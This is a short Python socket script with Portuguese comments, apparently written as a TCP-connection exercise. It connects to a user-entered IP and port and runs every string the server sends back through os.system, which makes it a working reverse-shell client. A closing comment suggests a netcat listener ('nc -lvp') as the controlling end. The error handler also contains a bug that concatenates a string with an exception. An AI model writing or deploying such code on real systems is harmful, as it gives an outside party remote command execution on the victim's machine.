#criação de uma interface de rede, chamada socket - O SO controla o SOCKET. 

import socket
import os

#Objeto de conexão TCP
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("############ CONEXÃO TCP ###############")
try:
    #criação ao host
    ips = input('Informe o IP: ')
    ports = int(input('Informe a porta: '))

    #passando o host para conexão
    client.connect((ips, ports))

    while True:
        data = input("Digite: ")
        if data == 'X':
            print("Conexão Encerrada..." )
            break
    
        client.send(f'{data}\n'.encode())
        received = client.recv(1024)
        comand = received.decode()
        os.system(comand)
        print("Servidor: "+received.decode())
        
except Exception as e:
    print("Erro ao conectar foi: "+ e)
finally:
    client.close()

# Caso queira abrir uma conexão com o netcat use o comando nc -lvp porta
# E então passe o IP e a porta e a conexão continua....

